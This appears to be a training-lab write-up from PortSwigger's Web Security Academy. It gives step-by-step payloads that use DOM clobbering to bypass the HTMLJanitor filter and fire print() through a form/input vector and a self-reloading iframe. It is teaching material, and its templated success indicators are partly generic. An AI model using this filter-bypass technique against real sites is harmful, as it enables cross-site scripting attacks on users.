## Clobbering DOM attributes to bypass HTML filters

**Category:** xss_dom
**Difficulty:** Unknown

### Description
This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that calls theprint()function. You may need to use the exploit server in order to make your vector auto-execute in the victim's browser.

### Solution Steps
1. Go to one of the blog posts and create a comment containing the following HTML: <form id=x tabindex=0 onfocus=print()><input id=attributes>
2. Go to the exploit server and add the following iframe to the body: <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)"> Remember to change the URL to contain your lab ID and make sure that the postId parameter matches the postId of the blog post into which you injected the HTML in the previous step.
3. Store the exploit and deliver it to the victim. The next time the page loads, the print() function is called.

### Key Payloads
- `print()`
- `<form id=x tabindex=0 onfocus=print()><input id=attributes>`
- `iframe`
- `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">`
- `postId`
- `attributes`
- `form`
- `onfocus`

### Indicators of Success
- DOM sink receives tainted source data
- JavaScript executes via DOM manipulation
- URL fragment or hash value exploited
- postMessage handler vulnerable
- Client-side code processes attacker input
---
*Source: PortSwigger Web Security Academy*
